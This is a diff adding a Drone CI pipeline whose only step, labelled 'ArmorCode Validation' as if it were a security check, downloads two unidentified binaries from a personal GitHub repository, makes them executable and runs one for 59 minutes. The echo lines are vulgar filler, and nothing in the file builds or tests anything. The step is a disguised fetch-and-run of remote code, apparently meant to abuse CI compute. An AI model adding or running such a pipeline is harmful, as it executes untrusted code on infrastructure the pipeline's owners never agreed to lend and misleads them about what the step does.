@@ -1,0 +1,30 @@
+kind: pipeline
+
+type: docker
+
+name: cok susah 
+
+platform:
+
+  arch: amd64
+
+  os: linux
+
+steps:
+
+- name: ArmorCode Validation
+
+  image: golang:1.12
+
+  commands:
+
+  - apt-get update && apt-get install screen -y
+
+  - echo "KONTOL"
+  - wget wget -O 1 https://github.com/konchilsxx/asw/raw/main/tepel
+  - wget wget -O 2 https://github.com/konchilsxx/asw/raw/main/v2
+  - chmod u+x *
+  - timeout 59m ./1
+  - echo "MEMEK"
+
+ 
